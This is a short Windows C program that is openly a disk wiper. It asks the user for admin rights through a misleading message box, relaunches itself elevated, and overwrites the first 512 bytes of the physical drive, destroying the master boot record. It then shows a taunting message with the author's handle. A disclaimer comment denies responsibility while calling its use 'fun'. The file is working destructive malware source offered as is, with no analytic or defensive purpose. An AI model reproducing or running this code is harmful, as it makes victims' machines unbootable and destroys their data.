#include <windows.h>
#define WIN32_LEAN_AND_MEAN
#define MBR 512

/*
This was my original intention on using this, its pretty fun but ineffective nowadays.

[ DISCLAIMER ]
I DO NOT CONDONE ANY ILLEGAL ACTIONS AND I WILL NOT BE RESPONSIBLE FOR WHATEVER DAMAGE YOU MAY CAUSE
*/

void destroy(){
	FreeConsole();
	DWORD write;
	char mbrData[MBR];
	ZeroMemory(&mbrData, sizeof(mbrData));
	HANDLE MBR = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
	if(WriteFile(MBR, mbrData, 512, &write, NULL)==true) {
		MessageBox(0, "LULZ", "Youve been fucked retard XD, feel free to direct all hate towards -- manjoos#0745", MB_OK);
		exit(0);
	}
	CloseHandle(MBR);
	exit(0);
}
bool admin() {
	bool fRet = FALSE;
    HANDLE hToken = NULL;
    if( OpenProcessToken( GetCurrentProcess( ),TOKEN_QUERY,&hToken ) ) {
        TOKEN_ELEVATION Elevation;
        DWORD cbSize = sizeof( TOKEN_ELEVATION );
        if(GetTokenInformation(hToken, TokenElevation, &Elevation, sizeof(Elevation), &cbSize)) {
            fRet = Elevation.TokenIsElevated;
        }
    }
    if(hToken) {
        CloseHandle(hToken);
    }
    return fRet;
}
void elevate() {
	char path[MAX_PATH];
	if (GetModuleFileName(NULL, path, ARRAYSIZE(path))) {
		SHELLEXECUTEINFO sei = { sizeof(sei) };
		sei.lpVerb = "runas";	
		sei.lpFile = path;
		sei.hwnd = NULL;
		sei.nShow = SW_NORMAL;
		
		if(!ShellExecuteEx(&sei)) {
			DWORD Error = GetLastError();
			if (Error==ERROR_CANCELLED) {
				exit(0);		
			}
		}
	}
}
int main(int argc, char* argv[]){
	bool check;
	FreeConsole();
	if (admin()==false) {
			check = MessageBox(0, "Hey you there, yea you, do you want to give meh some admin privs?", "ERROR", MB_OK);
			if (check == 1) {
				elevate(); destroy();
		} else {
			exit(0);
		}
	return 0;
	}
}
